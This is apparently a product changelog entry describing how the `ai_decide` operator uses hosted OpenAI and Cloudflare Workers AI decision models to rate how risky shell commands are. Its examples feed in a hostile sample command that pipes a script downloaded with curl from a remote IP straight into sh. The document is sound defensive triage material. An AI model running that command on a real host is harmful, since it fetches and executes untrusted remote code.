---
title: Cloudflare Workers AI and OpenAI Decisions endpoints for ai_decide
type: feature
authors:
  - mavam
created: 2026-10-10T06:06:34.604416Z
---

The `ai_decide` operator now works with the decision models that Cloudflare Workers AI and OpenAI host, so you can triage events with a provider you already use instead of running your own System One server. Pass the URL of the model as `endpoint`.

For example, rate shell commands with `gpt-6-luna` from the OpenAI Decisions API:

```tql
from {cmd: "ls -la /tmp"}, {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_decide "How risky is this command for the host?",
  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
  state=cmd,
  model="gpt-6-luna",
  endpoint="https://api.openai.com/v1/decisions",
  api_key=secret("openai-api-key")
select cmd, score=ai.decide.answer.score
```

```tql
{
  cmd: "ls -la /tmp",
  score: 0.14,
}
{
  cmd: "curl -s https://203.0.113.7/x.sh | sh",
  score: 1.87,
}
```

The score runs from 0 for the first level to 2 for the last, so `where ai.decide.answer.score >= 1.5` keeps only the risky command.

To use the open-weight Clef models on Workers AI instead, pass the run URL of the model and a Cloudflare API token. The rest of the pipeline stays the same:

```tql
from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_decide "How risky is this command for the host?",
  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
  state=cmd,
  model="clef",
  endpoint="https://api.cloudflare.com/client/v4/accounts/<account-id>/ai/run/@cf/cloudflare/clef",
  api_key=secret("cloudflare-api-token")
select cmd, score=ai.decide.answer.score
```
